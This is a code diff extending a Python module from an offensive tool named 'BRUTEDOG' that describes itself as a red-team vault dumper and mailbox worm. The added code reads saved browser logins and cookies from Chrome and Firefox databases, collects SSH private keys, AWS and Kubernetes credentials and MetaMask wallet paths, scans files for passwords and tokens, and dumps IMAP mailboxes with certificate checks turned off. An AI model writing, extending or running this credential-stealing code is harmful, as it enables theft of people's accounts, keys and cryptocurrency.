@@ -5,14 +5,16 @@ import time
 import ssl
 import imaplib
 import asyncio
-import urllib.request
+import sqlite3
+import shutil
+from pathlib import Path
 
 _ssl_context = ssl.create_default_context()
 _ssl_context.check_hostname = False
 _ssl_context.verify_mode = ssl.CERT_NONE
 
 def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
-    """Connects to a verified IMAP mailbox account and dumps folder structures & messages on the run."""
+    """Synchronous IMAP folder and message dumper executed safely inside thread workers."""
     dump_data = {
         "user": user,
         "host": host,
@@ -52,54 +54,172 @@ def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
         
         os.makedirs("reports/dumps", exist_ok=True)
         dump_path = f"reports/dumps/imap_dump_{user.replace('@', '_at_')}.json"
-        with open(dump_path, "w") as f:
+        with open(dump_path, "w", encoding="utf-8") as f:
             json.dump(dump_data, f, indent=4)
             
         return True, dump_path
     except Exception as e:
         return False, str(e)
 
+def _harvest_browser_vaults():
+    """Scrapes local browser profile directories for cookies and login databases (Chromium/Firefox)."""
+    browser_findings = []
+    home_dir = Path.home()
+    
+    # Potential Chromium and mobile/desktop profile bases
+    profile_candidates = [
+        home_dir / ".config/google-chrome/Default",
+        home_dir / ".local/share/data/com.termux/files/home/.config/google-chrome/Default",
+        home_dir / "Library/Application Support/Google/Chrome/Default",
+        home_dir / ".mozilla/firefox"
+    ]
+    
+    for profile in profile_candidates:
+        if profile.exists():
+            # Check for Cookies or Login Data SQLite DBs
+            for db_name in ["Cookies", "Login Data", "places.sqlite"]:
+                db_path = profile / db_name
+                if not db_path.exists():
+                    # Check in parent profile paths if nested
+                    db_paths = list(profile.glob(f"**/{db_name}"))
+                else:
+                    db_paths = [db_path]
+                    
+                for found_db in db_paths:
+                    try:
+                        # Copy to avoid file lock issues
+                        temp_db = f"/tmp/vault_{db_name}_{int(time.time())}.db"
+                        shutil.copy2(found_db, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        
+                        if db_name == "Login Data":
+                            cursor.execute("SELECT origin_url, username_value FROM logins")
+                            for row in cursor.fetchall():
+                                browser_findings.append({"source": "Login Data", "url": row[0], "username": row[1]})
+                        elif db_name == "Cookies":
+                            cursor.execute("SELECT host_key, name FROM cookies LIMIT 50")
+                            for row in cursor.fetchall():
+                                browser_findings.append({"source": "Cookie Store", "host": row[0], "cookie_name": row[1]})
+                                
+                        conn.close()
+                        os.remove(temp_db)
+                    except Exception:
+                        pass
+    return browser_findings
+
+def _harvest_infrastructure_and_crypto_vaults():
+    """Traverses home and project paths for SSH keys, cloud credentials, and crypto wallets."""
+    infra_findings = {
+        "ssh_keys": [],
+        "cloud_configs": [],
+        "crypto_wallets": []
+    }
+    home_dir = Path.home()
+    
+    # 1. Infrastructure & Cloud Config Paths
+    target_paths = [
+        home_dir / ".ssh",
+        home_dir / ".aws",
+        home_dir / ".kube",
+        Path(".") / "config"
+    ]
+    
+    for t_path in target_paths:
+        if t_path.exists():
+            for root, dirs, files in os.walk(t_path):
+                for file in files:
+                    full_p = os.path.join(root, file)
+                    if file in ["id_rsa", "id_ed25519", "credentials", "config"]:
+                        try:
+                            with open(full_p, "r", encoding="utf-8", errors="ignore") as f:
+                                snippet = f.read(512) # Grab header sample
+                                infra_findings["ssh_keys" if "id_" in file else "cloud_configs"].append({
+                                    "file": full_p,
+                                    "preview": snippet[:100]
+                                })
+                        except Exception:
+                            pass
+
+    # 2. Crypto Wallet Artifact Paths (MetaMask LevelDB / Keystores)
+    crypto_paths = [
+        home_dir / ".config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
+        home_dir / ".local/share/io.metamask",
+        home_dir / "Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"
+    ]
+    
+    for c_path in crypto_paths:
+        if c_path.exists():
+            infra_findings["crypto_wallets"].append(str(c_path))
+            
+    return infra_findings
+
 async def harvest_email_intelligence(target_host, verified_hits=None):
     """
-    Pro Red-Team Intelligence & Mailbox Worm: 
-    1. Worms through local files, configs, and caches for emails, tokens, and keys on the fly.
-    2. Infiltrates live IMAP mailboxes if verified credentials are supplied by the engine.
+    Elite Red-Team Intelligence, Vault Dumper & Mailbox Worm:
+    1. Worms through local code, config, browser profiles, and cloud vaults.
+    2. Infiltrates live IMAP mailboxes asynchronously if verified credentials exist.
     """
-    print(f"\n\033[95m[***] ENGAGING AGGRESSIVE INTELLIGENCE & MAILBOX INFILTRATOR [{target_host}] [***]\033[0m")
+    print(f"\n\033[95m[***] ENGAGING ELITE INTELLIGENCE & VAULT SCRAPER [{target_host}] [***]\033[0m")
     
     discovered_emails = set()
     discovered_credentials = []
     
-    # 1. Active Web & Local Cache Scraping (Worming out configs, tokens, and keys)
     email_regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+')
     credential_regex = re.compile(r'(?:api[_-]?key|password|secret|token|auth)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]', re.IGNORECASE)
     
     local_search_paths = [".", "config", "reports"]
-    for path in local_search_paths:
-        if os.path.exists(path):
-            for root, dirs, files in os.walk(path):
-                skip_tokens = ["/tmp", "site-packages", "venv", ".git"]
-                if any(token in root for token in skip_tokens):
-                    continue
-                for file in files:
-                    if file.endswith(('.env', '.json', '.txt', '.conf', '.log', '.py')):
-                        file_path = os.path.join(root, file)
-                        try:
-                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
-                                content = f.read()
+    
+    # 1. Local Code, File, Browser Vault & Cloud Config Scraping (Async thread execution)
+    def _deep_sweep():
+        emails = set()
+        creds = []
+        
+        # Filesystem regex search
+        for path in local_search_paths:
+            if os.path.exists(path):
+                for root, dirs, files in os.walk(path):
+                    skip_tokens = ["/tmp", "site-packages", "venv", ".git"]
+                    if any(token in root for token in skip_tokens):
+                        continue
+                    for file in files:
+                        if file.endswith(('.env', '.json', '.txt', '.conf', '.log', '.py')):
+                            file_path = os.path.join(root, file)
+                            try:
+                                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                                    content = f.read()
+                                    for match in email_regex.findall(content):
+                                        if not any(ext in match.lower() for ext in ['.png', '.jpg', '.svg', 'example.com']):
+                                            emails.add(match)
+                                    for cred in credential_regex.findall(content):
+                                        if cred not in creds:
+                                            creds.append(cred)
+                            except Exception:
+                                pass
                                 
-                                for match in email_regex.findall(content):
-                                    if not any(ext in match.lower() for ext in ['.png', '.jpg', '.svg', 'example.com']):
-                                        discovered_emails.add(match)
-                                        
-                                for cred in credential_regex.findall(content):
-                                    if cred not in discovered_credentials:
-                                        discovered_credentials.append(cred)
-                                        print(f" \033[91m[+++] CREDENTIAL LEAK WORMED ON THE FLY: {cred[:10]}... (in {file_path})\033[0m")
-                        except Exception:
-                            pass
+        # Browser vault extraction
+        browser_data = _harvest_browser_vaults()
+        # Infrastructure & Crypto vault extraction
+        infra_data = _harvest_infrastructure_and_crypto_vaults()
+        
+        return emails, creds, browser_data, infra_data
 
-    # 2. Live IMAP Infiltrator (If verified credential hits exist)
+    local_emails, local_creds, browser_vaults, infra_vaults = await asyncio.to_thread(_deep_sweep)
+    discovered_emails.update(local_emails)
+    discovered_credentials.extend(local_creds)
+
+    for cred in discovered_credentials:
+        print(f" \033[91m[+++] CREDENTIAL LEAK WORMED: {cred[:10]}...\033[0m")
+        
+    if browser_vaults:
+        print(f" \033[92m[+++] BROWSER VAULT EXTRACTED: Found {len(browser_vaults)} active records/cookies.\033[0m")
+    if infra_vaults["ssh_keys"] or infra_vaults["cloud_configs"]:
+        print(f" \033[92m[+++] INFRASTRUCTURE VAULT DISCOVERED: SSH/Cloud configs located.\033[0m")
+    if infra_vaults["crypto_wallets"]:
+        print(f" \033[92m[+++] CRYPTO WALLET ARTIFACTS FOUND: Keystore/LevelDB caches targeted.\033[0m")
+
+    # 2. Live IMAP Infiltrator Execution
     if verified_hits:
         for hit in verified_hits:
             if hit.get("type") == "IMAP":
@@ -120,16 +240,26 @@ async def harvest_email_intelligence(target_host, verified_hits=None):
 
     print(f" \033[92m[+] Intelligence sweep complete. Harvested unique emails: {len(discovered_emails)}\033[0m")
     
+    # 3. Comprehensive Report Compilation
     os.makedirs("reports", exist_ok=True)
     report_path = "reports/intelligence_harvest.txt"
-    with open(report_path, "w") as out:
-        out.write("=== BRUTEDOG LIVE INTELLIGENCE & CREDENTIAL HARVEST ===\n")
-        out.write("DISCOVERED EMAILS:\n")
-        for email in sorted(discovered_emails):
-            out.write(f" - {email}\n")
-        out.write("\nDISCOVERED CREDENTIALS / TOKENS:\n")
-        for cred in discovered_credentials:
-            out.write(f" - {cred}\n")
+    try:
+        with open(report_path, "w", encoding="utf-8") as out:
+            out.write("=== BRUTEDOG ELITE INTELLIGENCE & VAULT HARVEST ===\n\n")
+            out.write("DISCOVERED EMAILS:\n")
+            for email in sorted(discovered_emails):
+                out.write(f" - {email}\n")
+            out.write("\nDISCOVERED CREDENTIALS / TOKENS:\n")
+            for cred in discovered_credentials:
+                out.write(f" - {cred}\n")
+            out.write("\nBROWSER VAULTS & COOKIES:\n")
+            out.write(json.dumps(browser_vaults, indent=4))
+            out.write("\n\nINFRASTRUCTURE & CRYPTO VAULTS:\n")
+            out.write(json.dumps(infra_vaults, indent=4))
             
-    print(f" \033[92m[+] Plaintext intelligence report compiled and saved to {report_path}\033[0m")
+        print(f" \033[92m[+] Comprehensive intelligence report compiled and saved to {report_path}\033[0m")
+    except Exception as e:
+        print(f" \033[91m[-] Failed to write intelligence report: {e}\033[0m")
+        
     return list(discovered_emails)
+
